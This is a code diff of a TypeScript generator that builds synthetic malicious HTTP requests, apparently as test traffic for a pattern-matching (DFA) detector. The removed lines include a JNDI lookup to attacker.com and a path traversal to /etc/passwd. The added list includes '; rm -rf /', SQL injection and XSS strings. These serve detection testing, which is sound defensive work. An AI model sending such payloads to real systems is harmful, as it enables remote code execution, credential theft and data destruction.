@@ -89,37 +89,64 @@ const generateBenignHTTP = (log: string[]): { hex: string; payload: string } => 
 };
 
 /**
- * Generate malicious HTTP request with injection/anomalies
+ * Generate malicious HTTP request with injection/anomalies matching DFA patterns
  */
 const generateMaliciousHTTP = (
   log: string[]
 ): { hex: string; payload: string; anomalies: string[] } => {
-  log.push('1. Generating malicious HTTP request with anomalies');
+  log.push('1. Generating malicious HTTP request with DFA-detectable patterns');
 
   const anomalies: string[] = [];
-  const injectionPatterns = [
-    "'; DROP TABLE users; --",
-    '<script>alert("XSS")</script>',
-    '../../../etc/passwd',
-    '${jndi:ldap://attacker.com/Evil}',
-    '%00<script>alert(1)</script>'
+
+  // DFA pattern matching - select from definite malicious signatures
+  const dfaMaliciousPatterns = [
+    { name: 'virus', payload: 'virus_payload.exe' },
+    { name: 'malware', payload: 'malware_detection' },
+    { name: 'exploit', payload: 'exploit_kit_payload' },
+    { name: 'eval', payload: 'eval(dangerous_code)' },
+    { name: 'base64', payload: 'base64_encoded_malware' },
+    { name: '<script tag', payload: '<script>alert("xss")</script>' },
+    { name: 'SQL injection', payload: "'; DROP TABLE users; --" },
+    { name: 'UNION SELECT', payload: 'UNION SELECT * FROM passwords' },
+    { name: 'command injection', payload: '; rm -rf /' }
   ];
 
-  const injectionType = injectionPatterns[Math.floor(Math.random() * injectionPatterns.length)];
-  anomalies.push(`SQL/Script Injection Detected: ${injectionType.substring(0, 30)}...`);
+  const selectedPattern = dfaMaliciousPatterns[Math.floor(Math.random() * dfaMaliciousPatterns.length)];
+  anomalies.push(`DFA Pattern Detected: ${selectedPattern.name}`);
 
-  log.push(`2. Selected injection pattern: ${injectionType.substring(0, 40)}...`);
+  log.push(`2. Selected DFA malicious pattern: ${selectedPattern.name}`);
 
-  // Add oversized headers (HTTP anomaly)
-  let headers = `GET /search?q=${encodeURIComponent(injectionType)} HTTP/1.1\r\n`;
+  // Build malicious HTTP request
+  let headers = `GET /search HTTP/1.1\r\n`;
   headers += `Host: example.com\r\n`;
-  headers += `User-Agent: ${'A'.repeat(500)}\r\n`; // Abnormally long User-Agent
-  anomalies.push('Abnormally long User-Agent header (500+ chars)');
-  headers += `X-Custom-Header: ${injectionType}\r\n`;
-  anomalies.push('Suspicious custom header with injection payload');
+  headers += `User-Agent: Mozilla/5.0\r\n`;
+
+  // Inject the pattern into the request
+  if (selectedPattern.name.includes('SQL') || selectedPattern.name.includes('UNION')) {
+    headers += `Cookie: id=${selectedPattern.payload}\r\n`;
+    anomalies.push('Malicious SQL pattern in cookie');
+  } else if (selectedPattern.name === '<script tag') {
+    headers += `X-Payload: ${selectedPattern.payload}\r\n`;
+    anomalies.push('XSS payload detected in header');
+  } else if (selectedPattern.name === 'eval') {
+    headers += `X-Custom: eval(${selectedPattern.payload})\r\n`;
+    anomalies.push('Code eval function detected');
+  } else if (selectedPattern.name === 'base64') {
+    headers += `Authorization: Bearer ${selectedPattern.payload}\r\n`;
+    anomalies.push('Base64 encoded payload in authorization');
+  } else if (selectedPattern.name === 'command injection') {
+    headers += `path=/api${selectedPattern.payload}\r\n`;
+    anomalies.push('Command injection pattern detected');
+  } else {
+    // virus, malware, exploit, etc.
+    headers += `X-Malware: ${selectedPattern.payload}\r\n`;
+    anomalies.push(`${selectedPattern.name} signature detected`);
+  }
+
+  headers += `Content-Length: ${selectedPattern.payload.length}\r\n`;
   headers += `Connection: close\r\n\r\n`;
 
-  log.push('3. Injected malicious payloads into headers');
+  log.push(`3. Injected malicious pattern into HTTP request`);
   log.push(`4. Added ${anomalies.length} anomalies to packet`);
 
   const hex = Array.from(headers)
